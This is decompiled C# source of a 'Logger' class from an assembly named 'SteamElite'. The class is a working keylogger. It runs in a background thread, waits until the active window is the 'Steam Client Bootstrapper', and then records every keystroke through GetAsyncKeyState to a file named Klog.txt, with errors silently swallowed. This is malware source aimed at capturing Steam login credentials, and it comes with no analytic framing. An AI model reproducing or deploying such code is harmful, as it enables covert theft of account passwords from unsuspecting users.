// Decompiled with JetBrains decompiler
// Type: Logger
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class Logger
{
  private bool workstate = true;
  private string path = "\\Klog.txt";
  private GWH g;

  [DllImport("user32.dll")]
  public static extern int GetAsyncKeyState(int i);

  public Logger(string path)
  {
    this.path = path + this.path;
    this.g = new GWH();
    this.workstate = true;
    new Thread(new ThreadStart(this.StartLogging)).Start();
  }

  public void Stop()
  {
    this.workstate = false;
  }

  private void timeStop()
  {
    Thread.Sleep(180000);
  }

  private void StartLogging()
  {
    try
    {
      new Thread(new ThreadStart(this.timeStop)).Start();
      using (FileStream fileStream = new FileStream(this.path, FileMode.Append, FileAccess.Write))
      {
label_8:
        while (this.workstate)
        {
          Thread.Sleep(10);
          if (this.g.GetActiveWindowTitle() == "Steam Client Bootstrapper")
          {
            for (int i = 0; i < (int) byte.MaxValue; ++i)
            {
              switch (Logger.GetAsyncKeyState(i))
              {
                case -32767:
                case 1:
                  byte[] bytes = Encoding.UTF8.GetBytes(((Keys) i).ToString() + " ");
                  fileStream.Write(bytes, 0, bytes.Length);
                  fileStream.Flush();
                  goto label_8;
                default:
                  continue;
              }
            }
          }
        }
        fileStream.Close();
      }
    }
    catch
    {
    }
  }
}
